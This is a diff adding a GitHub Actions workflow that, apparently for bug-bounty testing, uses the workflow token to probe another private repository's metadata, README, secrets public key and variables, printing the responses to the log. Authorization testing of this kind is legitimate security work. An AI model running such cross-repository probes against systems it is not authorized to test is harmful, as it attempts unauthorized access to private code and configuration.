@@ -1,0 +1,36 @@
+name: actions-token-crossrepo-scope
+on:
+  push:
+    paths:
+      - .github/workflows/actions-token-crossrepo-scope.yml
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      actions: read
+      issues: read
+      pull-requests: read
+      metadata: read
+    steps:
+      - name: Context
+        run: |
+          echo "repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR"
+      - name: Cross-repo probes
+        env:
+          TARGET_REPO: lamingwearehackerone/bb-private2-d06e1dcb
+        run: |
+          set -u
+          api() {
+            path="$1"
+            echo "== GET $path"
+            code=$(curl -sS -o resp.json -w '%{http_code}'               -H "Authorization: Bearer $GITHUB_TOKEN"               -H "Accept: application/vnd.github+json"               "https://api.github.com$path")
+            echo "code=$code"
+            head -c 300 resp.json; echo
+          }
+          api "/repos/$TARGET_REPO"
+          api "/repos/$TARGET_REPO/contents/README.md"
+          api "/repos/$TARGET_REPO/actions/secrets/public-key"
+          api "/repos/$TARGET_REPO/actions/variables"
